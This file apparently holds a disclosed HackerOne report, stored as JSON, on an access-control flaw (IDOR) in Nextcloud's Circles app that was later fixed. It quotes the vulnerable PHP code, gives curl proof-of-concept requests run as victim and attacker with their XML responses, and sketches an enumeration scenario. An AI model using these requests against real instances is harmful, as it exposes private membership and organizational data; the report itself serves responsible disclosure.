@@ -1,0 +1,152 @@
+{
+  "id": 3484601,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDg0NjAx",
+  "url": "https://hackerone.com/reports/3484601",
+  "title": "Team membership information returned on API level based on ID",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-01-02T09:03:48.430Z",
+  "submitted_at": "2026-01-02T09:03:48.623Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "milou",
+    "url": "/milou",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-17T05:49:15.969Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-17T05:49:15.805Z",
+  "team_member_agreed_on_going_public_at": "2026-09-17T05:42:08.238Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The `getMembership()` method in `MembershipService` and `MembershipRequest` does not verify that the requesting user has permission to view membership information for a given circle and user combination. This allows any authenticated user to query membership details (including inheritance paths, membership levels, and circle relationships) for any circle and any user by simply knowing or guessing their IDs.\n\nThe vulnerability exists because:\n1. `MembershipService::getMembership()` (line 134) directly calls `MembershipRequest::getMembership()` without any authorization check\n2. `MembershipRequest::getMembership()` (line 73) queries the database using only `circleId` and `singleId` without verifying the current user's permissions\n3. The `link()` endpoint in `LocalController` (line 581-590) exposes this functionality without proper access control\n\n### Vulnerable Code\n\n**File:** `lib/Service/MembershipService.php`\n\n```php\n/**\n * @param string $circleId\n * @param string $singleId\n * @param bool $detailed\n *\n * @return Membership\n * @throws MembershipNotFoundException\n * @throws RequestBuilderException\n */\npublic function getMembership(string $circleId, string $singleId, bool $detailed = false): Membership {\n    $membership = $this->membershipRequest->getMembership($circleId, $singleId);  // No authorization check!\n    if ($detailed) {\n        $details = $this->circleRequest->getCirclesByIds($membership->getInheritancePath());\n        $membership->setInheritanceDetails($details);  // Also leaks circle details\n    }\n    \n    return $membership;\n}\n```\n\n**File:** `lib/Db/MembershipRequest.php`\n\n```php\n/**\n * @param string $circleId\n * @param string $singleId\n *\n * @return Membership\n * @throws MembershipNotFoundException\n */\npublic function getMembership(string $circleId, string $singleId): Membership {\n    $qb = $this->getMembershipSelectSql();\n    $qb->limitToCircleId($circleId);\n    $qb->limitToSingleId($singleId);\n    $qb->leftJoinCircleConfig(self::TABLE_MEMBERSHIP);\n    \n    return $this->getItemFromRequest($qb);  // No permission check!\n}\n```\n\n**File:** `lib/Controller/LocalController.php`\n\n```php\n/**\n * @NoAdminRequired\n *\n * @param string $circleId\n * @param string $singleId\n *\n * @return DataResponse\n * @throws OCSException\n */\npublic function link(string $circleId, string $singleId): DataResponse {\n    try {\n        $this->setCurrentFederatedUser();\n        $membership = $this->membershipService->getMembership($circleId, $singleId, true);  // No authorization!\n        \n        return new DataResponse($this->serialize($membership));\n    } catch (Exception $e) {\n        $this->e($e, ['circleId' => $circleId, 'singleId' => $singleId]);\n        throw new OCSException($e->getMessage(), (int)$e->getCode());\n    }\n}\n```\n\n**Route affected:**\n- `GET /ocs/v2.php/circles/link/{circleId}/{singleId}` - View membership information for any circle and user\n\n### Proof of Concept\n\n**Test Environment:**\n- Nextcloud Version: 32.0.3\n- Circles App Version: 32.0.0\n\n**Attacker Requirements:**\n- A valid authenticated user account\n- Knowledge or ability to guess/brute-force `circleId` and `singleId` values\n- Ability to make HTTP requests to the Nextcloud instance\n\n**Steps to Reproduce:**\n\n1. **Create a circle as the victim user:**\n```bash\ncurl -X POST \"http://localhost:8080/ocs/v2.php/apps/circles/circles\" \\\n  -H \"OCS-APIRequest: true\" \\\n  -H \"Content-Type: application/json\" \\\n  -u victim:Testing-/:321SS \\\n  -d '{\"name\": \"Victim Secret Circle\", \"personal\": false}'\n```\n\n**Response (victim's circle created):**\n```xml\n<data>\n  <id>r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk</id>\n  <name>Victim Secret Circle</name>\n  <displayName>Victim Secret Circle</displayName>\n  <initiator>\n    <singleId>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</singleId>\n    <userId>victim</userId>\n  </initiator>\n</data>\n```\n\n2. **Access membership information as the victim (legitimate access):**\n```bash\ncurl -X GET \"http://localhost:8080/ocs/v2.php/apps/circles/link/r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk/ovYvboLMBNGvRXSkqhgllIKo6T7fvZl\" \\\n  -H \"OCS-APIRequest: true\" \\\n  -u victim:Testing-/:321SS\n```\n\n**Response (victim accessing their own membership - expected):**\n```xml\n<data>\n  <singleId>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</singleId>\n  <circleId>r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk</circleId>\n  <circleConfig>0</circleConfig>\n  <level>9</level>\n  <inheritanceFirst>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</inheritanceFirst>\n  <inheritanceLast>r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk</inheritanceLast>\n  <inheritancePath>\n    <element>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</element>\n  </inheritancePath>\n  <inheritanceDepth>1</inheritanceDepth>\n  <inheritanceDetails>\n    <element>\n      <id>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</id>\n      <name>user:victim:ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</name>\n      <displayName>victim</displayName>\n      <userId>victim</userId>\n      <owner>\n        <userId>victim</userId>\n      </owner>\n    </element>\n  </inheritanceDetails>\n</data>\n```\n\n3. **Access the SAME membership information as an attacker (unauthorized access):**\n```bash\ncurl -X GET \"http://localhost:8080/ocs/v2.php/apps/circles/link/r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk/ovYvboLMBNGvRXSkqhgllIKo6T7fvZl\" \\\n  -H \"OCS-APIRequest: true\" \\\n  -u attacker:Testing-/:321S\n```\n\n**Response (attacker accessing victim's membership - VULNERABILITY CONFIRMED):**\n```xml\n<data>\n  <singleId>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</singleId>\n  <circleId>r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk</circleId>\n  <circleConfig>0</circleConfig>\n  <level>9</level>\n  <inheritanceFirst>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</inheritanceFirst>\n  <inheritanceLast>r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk</inheritanceLast>\n  <inheritancePath>\n    <element>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</element>\n  </inheritancePath>\n  <inheritanceDepth>1</inheritanceDepth>\n  <inheritanceDetails>\n    <element>\n      <id>ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</id>\n      <name>user:victim:ovYvboLMBNGvRXSkqhgllIKo6T7fvZl</name>\n      <displayName>victim</displayName>\n      <userId>victim</userId>\n      <owner>\n        <userId>victim</userId>\n      </owner>\n    </element>\n  </inheritanceDetails>\n</data>\n```\n\n**Proof of Exploitation:**\n- Both requests (victim and attacker) return **identical data**\n- The attacker successfully accessed the victim's private circle membership information\n- The response includes sensitive details:\n  - Circle ID: `r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk`\n  - User's singleId: `ovYvboLMBNGvRXSkqhgllIKo6T7fvZl`\n  - Membership level: `9` (Owner)\n  - Inheritance path and complete circle details\n  - User information (userId: `victim`)\n\n**Response includes:**\n- Membership level and status\n- Inheritance path (list of circle IDs)\n- Complete circle details for all circles in the inheritance path (when `detailed=true`)\n- Circle configurations and visibility settings\n- User identification information\n\n**Proof that there is no mitigation to stop the attack:**\n\n**1. No Authorization Check in Controller Layer:**\nThe `link()` endpoint in `LocalController::link()` (line 581-590) calls `getMembership()` with `detailed=true` without any authorization verification. The only check is `setCurrentFederatedUser()` which only verifies the user is authenticated, not that they have permission to view the requested membership. **Code path:** `LocalController::link()` → `MembershipService::getMembership()` → **NO PERMISSION CHECK**.\n\n**2. No Authorization Check in Service Layer:**\n`MembershipService::getMembership()` (line 134-142) directly calls `MembershipRequest::getMembership()` without any authorization logic. There is no call to verify circle access, no check if the current user is a member, and no validation that the user can view information about the target `singleId`. **The method signature shows no `$initiator` parameter, confirming no permission context is passed.**\n\n**3. Database Query Has Zero Permission Filtering:**\n`MembershipRequest::getMembership()` (line 73-80) builds a query using only `limitToCircleId()` and `limitToSingleId()` - these are simple WHERE clauses with no JOIN to membership tables or permission checks. The query builder `getMembershipSelectSql()` (line 50-59) creates a basic SELECT statement with no authorization joins. **The query will return data for ANY circleId/singleId combination if it exists in the database.**\n\n**4. Detailed Mode Exposes Additional Unauthorized Data:**\nWhen `detailed=true` (always used by the `link()` endpoint), the code calls `getCirclesByIds()` (line 137) which also has **ZERO authorization checks**. This method (CircleRequest.php:324-335) uses `minimumLevel => Member::LEVEL_NONE`, meaning it requires no membership at all. **This leaks complete circle details for all circles in the inheritance path without any permission verification.**\n\n**5. Endpoint is Publicly Accessible to All Authenticated Users:**\nThe `link()` endpoint is marked with `@NoAdminRequired` annotation (line 237), meaning any authenticated user can access it. There is no rate limiting, no additional authorization middleware, and no checks beyond basic authentication. **Any user with a valid session can query membership information for any circle/user combination.**\n\n**6. No Exception Handling Prevents Information Disclosure:**\nThe only exception that can occur is `MembershipNotFoundException` if the combination doesn't exist. However, this provides an oracle for enumeration - attackers can distinguish between \"membership exists\" (returns data) and \"membership doesn't exist\" (throws exception). **The error handling does not prevent information disclosure, it only prevents access to non-existent memberships.**\n\n## Impact\n\nThis vulnerability allows any authenticated user to:\n- **Access membership information** for any circle and user combination\n- **Discover private/hidden circles** by enumerating membership relationships\n- **Map organizational structure** through inheritance path information\n- **Determine membership levels** and hierarchies without authorization\n- **Identify circle relationships** and nested structures\n- **Leak sensitive organizational data** through membership enumeration\n\n**Business Impact:**\n- Violation of privacy for private circles and teams\n- Exposure of organizational structure and relationships\n- Potential for social engineering attacks using discovered relationships\n- Violation of data protection regulations (GDPR, etc.)\n- Information disclosure that could aid in further attacks\n\n**Affected Data:**\n- All circle memberships in the system\n- Inheritance relationships between circles\n- Circle configurations and visibility settings\n- User-circle relationships\n\n**Real-world Attack Scenario:**\nAn attacker could:\n1. Enumerate all circles a target user belongs to\n2. Discover private executive circles or confidential teams\n3. Map organizational hierarchy through inheritance paths\n4. Identify key personnel and their circle memberships\n5. Use this information for targeted social engineering attacks",
+  "bounty_amount": "200.0",
+  "formatted_bounty": "$200",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-17T05:42:08.432Z",
+  "allow_singular_disclosure_after": 2587256.394922636,
+  "singular_disclosure_allowed": false,
+  "vote_count": 1,
+  "voters": [
+    "suul"
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 68199,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/circles",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 882558,
+      "category": "team",
+      "content": "Security advisory in https://github.com/nextcloud/security-advisories/security/advisories/GHSA-f99w-3pm7-v4cv",
+      "updated_at": "2026-07-30T13:15:18.666Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 89223,
+        "username": "nickvergessen",
+        "name": "Joas Schilling",
+        "bio": "",
+        "cleared": false,
+        "verified": true,
+        "website": null,
+        "location": "Germany",
+        "created_at": "2016-07-01T08:17:59.061Z",
+        "url": "https://hackerone.com/nickvergessen",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/f0e07660005686ec92c43da54c0094c1ac1b490ea8c5eac04a4081d912d6ce36"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
